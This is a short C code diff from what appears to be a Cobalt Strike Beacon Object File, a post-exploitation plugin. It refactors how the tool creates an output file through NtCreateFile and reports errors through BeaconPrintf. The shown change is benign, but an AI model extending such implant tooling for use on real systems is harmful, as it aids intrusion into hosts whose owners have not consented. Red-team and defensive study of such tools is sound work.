-            status = NTDLL$NtCreateFile(
-                &hOutput,
-                FILE_WRITE_DATA | SYNCHRONIZE,
-                &objAttr,
-                &ioStatus,
-                NULL,
-                FILE_ATTRIBUTE_NORMAL,
-                0,
-                FILE_OVERWRITE_IF,
-                FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
-                NULL,
-                0
-            );
-            
-            if (!NT_SUCCESS(status)) {
-                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create output file: 0x%08X\n", status);
+            if (!CreateOutputFileNt(destFileW, &hOutput)) {
                 intFree(extents);
+                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create output file\n");
                 goto cleanup;
             }
             
